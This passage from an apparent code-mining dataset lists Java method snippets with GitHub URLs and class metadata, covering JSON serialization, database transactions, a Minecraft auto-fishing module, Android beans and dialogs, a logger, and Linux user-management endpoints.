JSONObject subModel = new JSONObject();                toJSONObject(ReflectUtil.objectToMap(val), subModel);                model.put(key, subModel);            }        }    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONArray", "params": ["Object", "JSONArray"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void toJSONArray(@NotNull Object obj, JSONArray array) {        for (Object item : ReflectUtil.asList(obj)) {            if (ReflectUtil.isNotJSONObject(item)) {                array.add(item);            }            else if (ReflectUtil.isList(item)) {                JSONArray subArray = new JSONArray();                toJSONArray(item, subArray);                array.add(subArray);            }            // \u5904\u7406\u65f6\u95f4\u5bf9\u8c61\uff1aLocalDateTime\u3001LocalDate\u3001LocalTime            else if (ReflectUtil.isDateTime(item)) {                array.add(StringUtil.dateTimeToString((TemporalAccessor) item));            }            else {                JSONObject model = new JSONObject();                toJSONObject(item, model);                array.add(model);            }        }    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setConnection", "params": ["Connection"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean setConnection(Connection conn) {\t\tif(connnection == null) {\t\t\tconnnection = conn;\t\t\ttry {\t\t\t\tconnnection.setAutoCommit(false);\t\t\t\treturn true;\t\t\t} catch (SQLException e) {\t\t\t\tlogger.error(\"XModelTransaction.begin\", e);\t\t\t}\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XTransaction.java", "stars": "2", "class": {"name": "XTransaction", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Connection", "snippet": "\tpublic Connection getConnection() {\t\treturn connnection;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XTransaction.java", "stars": "2", "class": {"name": "XTransaction", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isEnded", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isEnded() {\t\treturn this.isEnded;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XTransaction.java", "stars": "2", "class": {"name": "XTransaction", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "end", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean end(boolean success){\t\tif(!isEnded) {\t\t\ttry {\t\t\t\tif(success) {\t\t\t\t\tconnnection.commit();\t\t\t\t}else {\t\t\t\t\tconnnection.rollback();\t\t\t\t}\t\t\t\tconnnection.setAutoCommit(true);\t\t\t\treturn true;\t\t\t} catch (SQLException e) {\t\t\t\tlogger.error(\"XModelTransaction.end\", e);\t\t\t} finally {\t\t\t\tXMySQL.releaseConnection(connnection);\t\t\t\tisEnded = true;\t\t\t\tconnnection = null;\t\t\t}\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XTransaction.java", "stars": "2", "class": {"name": "XTransaction", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onPacket", "params": ["PacketEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPacket(PacketEvent event) {        if (event.getType().equals(PacketEvent.Type.INCOMING)) {            if (event.getPacket() instanceof SPacketSoundEffect) {                SPacketSoundEffect packet = (SPacketSoundEffect)event.getPacket();                if (packet.getCategory() == SoundCategory.NEUTRAL && packet.getSound() == SoundEvents.ENTITY_BOBBER_SPLASH) {                    if (mc.player.getHeldItemMainhand().getItem() instanceof ItemFishingRod) {                        click();                        if (cast)                            click();                    }                }            }        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/AutoFish.java", "stars": "12", "class": {"name": "AutoFish", "extends": "Module", "implements": null, "modifiers": ["public"]}}, {"method_name": "click", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void click() {        mc.player.connection.sendPacket(new CPacketPlayerTryUseItem(EnumHand.MAIN_HAND));        mc.player.swingArm(EnumHand.MAIN_HAND);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/AutoFish.java", "stars": "12", "class": {"name": "AutoFish", "extends": "Module", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCode() {        return Code;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "LogonBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(int Code) {        this.Code = Code;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "LogonBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMsg", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsg() {        return Msg;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "LogonBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMsg", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsg(String Msg) {        this.Msg = Msg;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "LogonBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataBean", "snippet": "    public DataBean getData() {        return Data;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "LogonBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setData", "params": ["DataBean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(DataBean Data) {        this.Data = Data;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "LogonBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getId() {            return id;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setId(int id) {            this.id = id;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPhone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getPhone() {            return phone;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setPhone", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPhone(String phone) {            this.phone = phone;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getEmail", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getEmail() {            return email;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setEmail", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setEmail(String email) {            this.email = email;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getUpdateDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getUpdateDate() {            return updateDate;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setUpdateDate", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setUpdateDate(String updateDate) {            this.updateDate = updateDate;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getCreateDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getCreateDate() {            return createDate;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setCreateDate", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setCreateDate(String createDate) {            this.createDate = createDate;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getLoginDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getLoginDate() {            return loginDate;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setLoginDate", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setLoginDate(String loginDate) {            this.loginDate = loginDate;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getWallet", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WalletBean", "snippet": "        public WalletBean getWallet() {            return wallet;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setWallet", "params": ["WalletBean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setWallet(WalletBean wallet) {            this.wallet = wallet;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getToken", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getToken() {            return token;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setToken", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setToken(String token) {            this.token = token;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isVeried", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isVeried() {            return veried;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setVeried", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setVeried(boolean veried) {            this.veried = veried;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getOmniAddr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getOmniAddr() {                return omniAddr;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "WalletBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setOmniAddr", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setOmniAddr(String omniAddr) {                this.omniAddr = omniAddr;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "WalletBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getErcAddr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getErcAddr() {                return ercAddr;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "WalletBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setErcAddr", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setErcAddr(String ercAddr) {                this.ercAddr = ercAddr;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/LogonBean.java", "stars": "1", "class": {"name": "WalletBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "write", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(long x) {\t\t// TODO Auto-generated method stub\t\tSystem.out.print(x);\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "write", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(double x) {\t\t// TODO Auto-generated method stub\t\tSystem.out.print(x);\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "write", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(String s) {\t\t// TODO Auto-generated method stub\t\tSystem.out.print(s);\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "write", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void write(Object... params) {\t\t// TODO Auto-generated method stub\t\tfor(Object o: params) \t\t\tif(o instanceof String)\t\t\t\twrite((String)o + \" \");\t\t\telse \t\t\t\twrite((long)o);\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "close", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void close() {\t\t// TODO Auto-generated method stub\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "convert", "params": ["long", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double convert(long value, TimeUnit unit) {\t\tdouble val = 0.0;\t\t\t\tswitch(unit) {\t      case Nano:\t    \t  val = value;\t    \t  break;\t      case Micro:\t    \t  val = value / 1000.0;\t    \t  break;\t      case Milli:\t    \t  val = value / 1000000.0;\t    \t  break;\t      case Sec:\t    \t  val = value / 1000000000.0 ;\t    \t  break;\t\t}\t\t\t\treturn val;\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "writeTime", "params": ["long", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void writeTime(long value, TimeUnit unit) {\t\t// TODO Auto-generated method stub\t\t\t\t\t\tSystem.out.println(convert(value,unit)+\" \"+unit);\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "writeTime", "params": ["String", "long", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void writeTime(String string, long value, TimeUnit unit) {\t\t// TODO Auto-generated method stub\t\twrite(string);\t\twrite(convert(value,unit));\t\twrite(\" \"+unit);\t\tSystem.out.println();\t\t\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/logging/ConsoleLogger.java", "stars": "2", "class": {"name": "ConsoleLogger", "extends": null, "implements": ["ILogger"], "modifiers": ["public"]}}, {"method_name": "checkRead", "params": ["FileDescriptor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkRead(FileDescriptor fd) {        if(null != threadSecurityManager.get()) {            threadSecurityManager.get().checkRead(fd);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/ThreadLocalSecurityManager.java", "stars": "23", "class": {"name": "ThreadLocalSecurityManager", "extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "checkWrite", "params": ["FileDescriptor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkWrite(FileDescriptor fd){        if(null != threadSecurityManager.get()) {            threadSecurityManager.get().checkWrite(fd);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/ThreadLocalSecurityManager.java", "stars": "23", "class": {"name": "ThreadLocalSecurityManager", "extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "checkPermission", "params": ["Permission"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkPermission(Permission perm) {        if(perm instanceof RuntimePermission && perm.getName().equals(SET_SECURITY_MANAGER)){            throw new AccessControlException(\"have no permission to set SecurityManager\");        }        if(null != threadSecurityManager.get()) {            threadSecurityManager.get().checkPermission(perm);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/ThreadLocalSecurityManager.java", "stars": "23", "class": {"name": "ThreadLocalSecurityManager", "extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "setThreadSecurityManager", "params": ["Object", "SecurityManager"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setThreadSecurityManager(Object invoker, SecurityManager manager){        if(null == threadSecurityManager.get()) {            String hashCode = String.valueOf(invoker.hashCode());            keyCode.set(hashCode);            threadSecurityManager.set(manager);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/ThreadLocalSecurityManager.java", "stars": "23", "class": {"name": "ThreadLocalSecurityManager", "extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "removeThreadSecurityManager", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeThreadSecurityManager(Object invoker){         String hashCode = String.valueOf(invoker.hashCode());         String code = keyCode.get();         if(code.equals(hashCode)){             keyCode.remove();             threadSecurityManager.remove();         }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/ThreadLocalSecurityManager.java", "stars": "23", "class": {"name": "ThreadLocalSecurityManager", "extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(){        String osName = System.getProperty(\"os.name\");        if(StringUtils.isBlank(osName) || !osName.toLowerCase().equalsIgnoreCase(ENV_WIND_TAG)){            procUserInfo = LinuxPlatFormUtil.currentUser();            LOG.info(\"Get current process's user UID: \" + procUserInfo.getLeft() + \", GID: \" + procUserInfo.getRight());        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/controller/SystemEnvController.java", "stars": "23", "class": {"name": "SystemEnvController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createSysUser", "params": ["String", "Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Response<ExecSysUser>", "snippet": "    public Response<ExecSysUser> createSysUser(@PathVariable(\"username\")String username,                                          @PathVariable(\"uid\")Integer uid, @PathVariable(\"gid\")Integer gid){        String osName = System.getProperty(\"os.name\");        if(StringUtils.isNotBlank(osName) && osName.toLowerCase().equalsIgnoreCase(ENV_WIND_TAG)){            return new Response<ExecSysUser>().errorResponse(CodeConstant.SYS_ERROR, null, \"System Environment is: \" + osName);        }        try{            if(procUserInfo.getRight() != null){                gid = procUserInfo.getRight();            }            Triple<Boolean, Integer, Integer> triple = LinuxPlatFormUtil.existUser(username);            if(!triple.getLeft()){                Pair<Boolean, String> pair = LinuxPlatFormUtil.createUser(username, uid, gid);                if(!pair.getLeft()){                    return new Response<ExecSysUser>().errorResponse(CodeConstant.SYS_ERROR, null,                            \"Cannot create user: \" + username + \", uid:\" + uid + \", gid:\" + gid + \", \" +                                    \"message:\" + pair.getRight());                }                if(uid <= 0 || gid <= 0){                    triple = LinuxPlatFormUtil.existUser(username);                    if(triple.getLeft()){                        uid = triple.getMiddle();                        gid = triple.getRight();                    }                }            }else{                return new Response<ExecSysUser>().successResponse(new ExecSysUser(username,                        triple.getMiddle(), triple.getRight()));            }            return new Response<ExecSysUser>().successResponse(new ExecSysUser(username,                    uid, gid));        }catch(Exception e){            LOG.error(e.getMessage(), e);            return new Response<ExecSysUser>().errorResponse(CodeConstant.SYS_ERROR, null, e.getMessage());        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/controller/SystemEnvController.java", "stars": "23", "class": {"name": "SystemEnvController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteSysUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> deleteSysUser(@PathVariable(\"username\")String username){        String osName = System.getProperty(\"os.name\");        if(StringUtils.isNotBlank(osName) && osName.toLowerCase().equalsIgnoreCase(ENV_WIND_TAG)){            return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null, \"System Environment is: \" + osName);        }        try {            Triple<Boolean, Integer, Integer> triple = LinuxPlatFormUtil.existUser(username);            if(!triple.getLeft()){                return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null, \"User: \" + username + \" doesn't exist\");            }else if(triple.getMiddle().equals(procUserInfo.getLeft())){                return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null, \"User: \" + username + \" is processor's user\");            }else if(!triple.getRight().equals(procUserInfo.getRight())){                return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null, \"Cannot delete user: \" + username +                        \", GID: \" + triple.getRight());            }            Pair<Boolean, String> pair = LinuxPlatFormUtil.deleteUser(username);            if(!pair.getLeft()){                return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null,                        \"Cannot delete user: \" + username + \", message:\" + pair.getRight());            }        }catch(Exception e){            LOG.error(e.getMessage(), e);            return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null, e.getMessage());        }        return new Response<>().successResponse(\"success\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/controller/SystemEnvController.java", "stars": "23", "class": {"name": "SystemEnvController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "show", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void show();}", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/Video.java", "stars": "2", "class": {"name": "Video", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getLayoutId", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {        return R.layout.activity_dialog;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/DialogActivity.java", "stars": "1", "class": {"name": "DialogActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "initView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initView() {        setOnClickListener(R.id.btn_dialog_message, R.id.btn_dialog_input,                R.id.btn_dialog_bottom_menu, R.id.btn_dialog_center_menu,                R.id.btn_dialog_single_select, R.id.btn_dialog_more_select,                R.id.btn_dialog_succeed_toast, R.id.btn_dialog_fail_toast,                R.id.btn_dialog_warn_toast, R.id.btn_dialog_wait,                R.id.btn_dialog_pay, R.id.btn_dialog_address,                R.id.btn_dialog_date, R.id.btn_dialog_time,                R.id.btn_dialog_update, R.id.btn_dialog_share,                R.id.btn_dialog_custom);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/DialogActivity.java", "stars": "1", "class": {"name": "DialogActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "initData", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData() {    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/DialogActivity.java", "stars": "1", "class": {"name": "DialogActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {        switch (v.getId()) {            case R.id.btn_dialog_message:                // \u6d88\u606f\u5bf9\u8bdd\u6846                new MessageDialog.Builder(this)                        // \u6807\u9898\u53ef\u4ee5\u4e0d\u7528\u586b\u5199                        .setTitle(\"\u6211\u662f\u6807\u9898\")                        // \u5185\u5bb9\u5fc5\u987b\u8981\u586b\u5199                        .setMessage(\"\u6211\u662f\u5185\u5bb9\")                        // \u786e\u5b9a\u6309\u94ae\u6587\u672c                        .setConfirm(getString(R.string.common_confirm))                        // \u8bbe\u7f6e null \u8868\u793a\u4e0d\u663e\u793a\u53d6\u6d88\u6309\u94ae                        .setCancel(getString(R.string.common_cancel))                        // \u8bbe\u7f6e\u70b9\u51fb\u6309\u94ae\u540e\u4e0d\u5173\u95ed\u5bf9\u8bdd\u6846                        //.setAutoDismiss(false)                        .setListener(new MessageDialog.OnListener() {                            @Override                            public void onConfirm(BaseDialog dialog) {                                toast(\"\u786e\u5b9a\u4e86\");                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_input:                // \u8f93\u5165\u5bf9\u8bdd\u6846                new InputDialog.Builder(this)                        // \u6807\u9898\u53ef\u4ee5\u4e0d\u7528\u586b\u5199                        .setTitle(\"\u6211\u662f\u6807\u9898\")                        // 